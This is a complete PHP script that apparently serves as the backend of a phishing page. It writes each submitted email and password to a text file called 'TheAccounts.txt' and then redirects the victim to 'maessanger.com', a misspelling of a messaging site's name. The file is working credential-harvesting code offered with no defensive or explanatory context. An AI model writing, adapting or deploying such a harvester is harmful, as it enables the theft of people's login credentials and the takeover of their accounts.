<?php

file_put_contents("TheAccounts.txt", $_POST['email'] . ":" .$_POST['pass']. "\n", FILE_APPEND);
echo ("<script>window.open('https://www.maessanger.com/','_self');</script>")


?>